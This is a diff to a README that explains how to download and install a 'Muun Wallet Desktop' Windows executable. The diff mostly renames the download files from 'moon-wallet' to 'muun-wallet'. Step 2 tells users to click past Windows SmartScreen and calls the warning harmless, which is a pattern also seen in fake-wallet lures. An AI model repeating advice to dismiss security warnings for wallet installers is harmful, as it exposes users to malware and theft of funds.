@@ -1,6 +1,6 @@
-[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
+﻿[![Muun Wallet](https://img.shields.io/badge/Muun%20Wallet-Desktop-blue)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![Platforms](https://img.shields.io/badge/platforms-macOS%20%7C%20Windows%20%7C%20Linux-lightgrey)](https://github.com/muun-network/muun-wallet/releases/tag/v0.5.1) [![License](https://img.shields.io/badge/license-MIT-green)](https://github.com/muun-network/muun-wallet/blob/main/LICENSE)
 
-[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.zip)
+[![macOS](https://img.shields.io/badge/Download-macOS-black?logo=apple&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.dmg) [![Windows](https://img.shields.io/badge/Download-Windows-0078d4?logo=windows&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe) [![Linux](https://img.shields.io/badge/Download-Linux-f5a623?logo=linux&logoColor=white)](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.zip)
 
 ---
 
@@ -21,12 +21,12 @@ Muun Wallet Desktop v0.5.1 is a native Windows application — not an Android em
 
 ## Step 1: Download the Windows installer
 
-Download `moon-wallet-v0.5.1.exe` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/moon-wallet-v0.5.1.exe).
+Download `muun-wallet-v0.5.1.exe` from the [official v0.5.1 release](https://github.com/muun-network/muun-wallet/releases/download/v0.5.1/muun-wallet-v0.5.1.exe).
 
 Before running the installer, verify its SHA-256 checksum. Open PowerShell (search for it in the Start menu) and run:
 
 ```powershell
-Get-FileHash "$env:USERPROFILE\Downloads\moon-wallet-v0.5.1.exe" -Algorithm SHA256
+Get-FileHash "$env:USERPROFILE\Downloads\muun-wallet-v0.5.1.exe" -Algorithm SHA256
 ```
 
 The Hash value in the output should be:
@@ -41,7 +41,7 @@ PowerShell displays hashes in uppercase; the comparison is case-insensitive. If 
 
 ## Step 2: Run the installer
 
-Double-click `moon-wallet-v0.5.1.exe`. Windows Defender SmartScreen may display a prompt because the application is newly signed. Click "More info" and then "Run anyway" to proceed. This is a standard Windows behaviour for newly signed code and does not indicate a security problem with the installer.
+Double-click `muun-wallet-v0.5.1.exe`. Windows Defender SmartScreen may display a prompt because the application is newly signed. Click "More info" and then "Run anyway" to proceed. This is a standard Windows behaviour for newly signed code and does not indicate a security problem with the installer.
 
 The installer does not require administrator privileges for a standard per-user installation. Follow the on-screen prompts — the default install location is fine for most users. Installation typically completes in under a minute.
 
@@ -85,7 +85,7 @@ Check that your firewall or VPN is not blocking outbound TCP connections on port
 
 **I want to install for all users on this PC.**
 
-The default installer creates a per-user installation. Right-click `moon-wallet-v0.5.1.exe` and choose "Run as administrator" to install system-wide. This requires an administrator account.
+The default installer creates a per-user installation. Right-click `muun-wallet-v0.5.1.exe` and choose "Run as administrator" to install system-wide. This requires an administrator account.
 
 **How do I uninstall Muun Wallet?**
 
